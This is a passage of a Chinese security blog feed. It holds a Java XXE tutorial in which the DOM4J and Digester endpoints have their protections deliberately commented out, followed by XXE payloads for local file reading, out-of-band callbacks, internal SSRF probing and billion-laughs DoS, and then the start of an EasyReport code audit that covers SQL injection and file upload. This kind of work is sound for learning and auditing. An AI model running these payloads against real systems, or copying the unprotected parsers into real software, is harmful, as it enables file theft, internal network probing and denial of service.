class="params">(java.io.InputStream is)</span> &#123;</span><br><span class="line">        java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(is).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DOM4J"><a href="#DOM4J" class="headerlink" title="DOM4J"></a>DOM4J</h3><p>​Dom4j 是一个易用的、开源的库，用于XML，XPath 和 XSLT。它应用于Java平台，采用了Java集合框架并完全支持 DOM，SAX 和 JAXP。是 Jdom 的升级品</p><p>​使用大致步骤：</p><blockquote><ol><li>创建 SAXReader 的对象 reader</li><li>通过 reader 对象的 read() 方法加载 xml 文件</li></ol></blockquote><p>​使用 JDOM 需要在 pom.xml 文件中引入该依赖后并重新加载，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.dom4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dom4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​创建DOM4Jtest文件，并键入如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javaxxetest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.dom4j.Document;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.DocumentException;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.io.SAXReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DOM4Jtest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/xxe/DOM4J&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">dom4jDemo</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取输入流</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> convertStreamToString(in);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建自定义的 XMLReader</span></span><br><span class="line">            <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 禁用外部实体解析以防止XXE攻击</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span></span><br><span class="line"><span class="comment">//            xmlReader.setProperty(&quot;http://xml.org/sax/properties/lexical-handler&quot;, null);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用自定义的 XMLReader 创建 SAXReader</span></span><br><span class="line">            <span class="type">SAXReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXReader</span>(xmlReader);</span><br><span class="line">            <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> reader.read(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)));</span><br><span class="line">            <span class="keyword">return</span> document.asXML().toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (DocumentException | SAXException | IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;EXCEPT ERROR!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">convertStreamToString</span><span class="params">(java.io.InputStream is)</span> &#123;</span><br><span class="line">        java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(is).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Digester"><a href="#Digester" class="headerlink" title="Digester"></a>Digester</h3><p>​Digester 是 Apache 下一款开源项目。 目前最新版本为 Digester 3.x 。</p><p>​Digester 是对 SAX 的包装，底层是采用的是 SAX 解析方式。</p><p>使用大致步骤：</p><blockquote><ol><li>创建 Digester 对象</li><li>调用 Digester 对象的 parse() 解析 XML</li></ol></blockquote><p>​使用 Digester 需要在 pom.xml 文件中引入该依赖后并重新加载，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-digester<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-digester<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​创建一个Digestertest文件，键入如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javaxxetest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.digester.Digester;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Digestertest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/xxe/Digester&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Digestertest</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取输入流</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> convertStreamToString(in);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建自定义的 XMLReader</span></span><br><span class="line">            <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 禁用外部实体解析以防止XXE攻击</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span></span><br><span class="line"><span class="comment">//            xmlReader.setProperty(&quot;http://xml.org/sax/properties/lexical-handler&quot;, null);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用自定义的 XMLReader 创建 Digester</span></span><br><span class="line">            <span class="type">Digester</span> <span class="variable">digester</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Digester</span>(xmlReader);</span><br><span class="line"></span><br><span class="line">            digester.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)));</span><br><span class="line">            <span class="keyword">return</span> digester.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;EXCEPT ERROR!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">convertStreamToString</span><span class="params">(java.io.InputStream is)</span> &#123;</span><br><span class="line">        java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(is).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JavaXXE漏洞利用"><a href="#JavaXXE漏洞利用" class="headerlink" title="JavaXXE漏洞利用"></a>JavaXXE漏洞利用</h2><h3 id="本地文件读取"><a href="#本地文件读取" class="headerlink" title="本地文件读取"></a>本地文件读取</h3><p><strong>Windows 系统读取文件需要 file:&#x2F;&#x2F;&#x2F;C:&#x2F; （带着盘符）</strong></p><p><strong>Linux&#x2F;Unix系统读取文件需要 file:&#x2F;&#x2F;&#x2F;</strong> </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/xxe.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://www.example.com&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="SSRF-探测内网"><a href="#SSRF-探测内网" class="headerlink" title="SSRF 探测内网"></a>SSRF 探测内网</h3><p>​可通过时间响应差异等情况探测内网IP，以及端口开放情况。如果内网存在redis未授权，可以尝试进行组合攻击。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:1234&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DoS-攻击"><a href="#DoS-攻击" class="headerlink" title="DoS 攻击"></a>DoS 攻击</h3><p>​其原理是通过不断迭代增大变量的空间，进而导致内存崩溃。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [<span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">lolz</span> (<span class="keyword">#PCDATA</span>)&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol1</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY lol2 &quot;</span>&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;<span class="string">&quot;&gt; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY lol3 &quot;</span>&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;<span class="string">&quot;&gt; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY lol4 &quot;</span>&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;<span class="string">&quot;&gt; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY lol5 &quot;</span>&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;<span class="string">&quot;&gt; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY lol6 &quot;</span>&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;<span class="string">&quot;&gt; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY lol7 &quot;</span>&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;<span class="string">&quot;&gt; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY lol8 &quot;</span>&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;<span class="string">&quot;&gt; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY lol9 &quot;</span>&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;<span class="string">&quot;&gt; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;tag&gt;&amp;lol9;&lt;/tag&gt;</span></span></span></span><br></pre></td></tr></table></figure><p><strong>更多可参考： <a href="https://github.com/payloadbox/xxe-injection-payload-list">https://github.com/payloadbox/xxe-injection-payload-list</a></strong> </p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[【Java代码审计】XXE_java xxe-CSDN博客](<a href="https://blog.csdn.net/qq_48201589/article/details/136421867?ops_request_misc=%7B%22request_id%22:%22c8d94e8777aa15588ac6cc594c411c26%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=c8d94e8777aa15588ac6cc594c411c26&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-136421867-null-null.142%5Ev101%5Epc_search_result_base6&utm_term=Java">https://blog.csdn.net/qq_48201589/article/details/136421867?ops_request_misc=%7B%22request%5Fid%22%3A%22c8d94e8777aa15588ac6cc594c411c26%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=c8d94e8777aa15588ac6cc594c411c26&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-136421867-null-null.142^v101^pc_search_result_base6&amp;utm_term=Java</a> XXE&amp;spm&#x3D;1018.2226.3001.4187)</p><p>[java审计-XXE_java xxe-CSDN博客](<a href="https://blog.csdn.net/admin741admin/article/details/129757862?ops_request_misc=%7B%22request_id%22:%22c8d94e8777aa15588ac6cc594c411c26%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=c8d94e8777aa15588ac6cc594c411c26&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-129757862-null-null.142%5Ev101%5Epc_search_result_base6&utm_term=Java">https://blog.csdn.net/admin741admin/article/details/129757862?ops_request_misc=%7B%22request%5Fid%22%3A%22c8d94e8777aa15588ac6cc594c411c26%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=c8d94e8777aa15588ac6cc594c411c26&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-129757862-null-null.142^v101^pc_search_result_base6&amp;utm_term=Java</a> XXE&amp;spm&#x3D;1018.2226.3001.4187)</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EasyReport</title>
      <link href="/2025/01/04/EasyReport/"/>
      <url>/2025/01/04/EasyReport/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>​EasyReport 是一款比较简单的在线 Web 报表工具，也算是一个种子项目，本身是基于<a href="http://ruoyi.vip/">若依</a>的前后端分离版本（SpringBoot + Vue）开发的，核心功能就是通过配置数据源和查询 SQL 来动态配置和生成报表（Table），并且可以针对不用的角色或者用户来配置各自的报表查看权限。</p><h2 id="项目依赖审计"><a href="#项目依赖审计" class="headerlink" title="项目依赖审计"></a>项目依赖审计</h2><p>​通过工具扫描发现该项目启用了fastjson，项目中也存在将JSON字符串解析为Java对象的情况，但是并未被控制器调用无法利用，所以这里跳过。</p><h2 id="单点漏洞审计"><a href="#单点漏洞审计" class="headerlink" title="单点漏洞审计"></a>单点漏洞审计</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>​该项目的数据库交互方式为mybatis，所以直接在mapper文件中寻找$。逐一排查后，在以下四个文件中找到了可疑注入点。</p><p><img src="/img/EasyReport/image-20241230093350694.png" alt="image-20241230093350694"></p><p>​其中src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;ReportMapper.xml无法正常使用，所以这里直接跳过。</p><h4 id="src-main-resources-mapper-system-SysDeptMapper-xml（失败）"><a href="#src-main-resources-mapper-system-SysDeptMapper-xml（失败）" class="headerlink" title="src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;system&#x2F;SysDeptMapper.xml（失败）"></a>src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;system&#x2F;SysDeptMapper.xml（失败）</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectDeptList&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;SysDept&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;SysDeptResult&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;selectDeptVo&quot;</span>/&gt;</span></span><br><span class="line">    where d.del_flag = &#x27;0&#x27;</span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;deptId != null and deptId != 0&quot;</span>&gt;</span></span><br><span class="line">        AND dept_id = #&#123;deptId&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;parentId != null and parentId != 0&quot;</span>&gt;</span></span><br><span class="line">        AND parent_id = #&#123;parentId&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;deptName != null and deptName != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">        AND dept_name like concat(&#x27;%&#x27;, #&#123;deptName&#125;, &#x27;%&#x27;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">        AND status = #&#123;status&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 数据范围过滤 --&gt;</span></span><br><span class="line">    $&#123;params.dataScope&#125;</span><br><span class="line">    order by d.parent_id, d.order_num</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​向上追溯后审计并测试后发现，params.dataScope会在传入时被删除，所以这里Scope是一个无用的参数，在后续的所有XML文件中都是相同的语句和参数，所以直接跳过。</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>​我们通过前端的头像上传定位到头像上传控制器。</p><h4 id="src-main-java-com-sdyx-web-controller-system-SysProfileController-java（成功）"><a href="#src-main-java-com-sdyx-web-controller-system-SysProfileController-java（成功）" class="headerlink" title="src&#x2F;main&#x2F;java&#x2F;com&#x2F;sdyx&#x2F;web&#x2F;controller&#x2F;system&#x2F;SysProfileController.java（成功）"></a>src&#x2F;main&#x2F;java&#x2F;com&#x2F;sdyx&#x2F;web&#x2F;controller&#x2F;system&#x2F;SysProfileController.java（成功）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Log(title = &quot;用户头像&quot;, businessType = BusinessType.UPDATE)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/avatar&quot;)</span></span><br><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">avatar</span><span class="params">(<span class="meta">@RequestParam(&quot;avatarfile&quot;)</span> MultipartFile file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!file.isEmpty()) &#123;</span><br><span class="line">        <span class="type">LoginUser</span> <span class="variable">loginUser</span> <span class="operator">=</span> getLoginUser();</span><br><span class="line">        <span class="type">String</span> <span class="variable">avatar</span> <span class="operator">=</span> FileUploadUtils.upload(EasyReportConfig.getAvatarPath(), file);</span><br><span class="line">        <span class="keyword">if</span> (userService.updateUserAvatar(loginUser.getUsername(), avatar)) &#123;</span><br><span class="line">            <span class="type">AjaxResult</span> <span class="variable">ajax</span> <span class="operator">=</span> AjaxResult.success();</span><br><span class="line">            ajax.put(<span class="string">&quot;imgUrl&quot;</span>, avatar);</span><br><span class="line">            <span class="comment">// 更新缓存用户头像</span></span><br><span class="line">            loginUser.getUser().setAvatar(avatar);</span><br><span class="line">            tokenService.setLoginUser(loginUser);</span><br><span class="line">            <span class="keyword">return</span> ajax;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.error(<span class="string">&quot;上传图片异常，请联系管理员&quot;</span>);</span><br><span 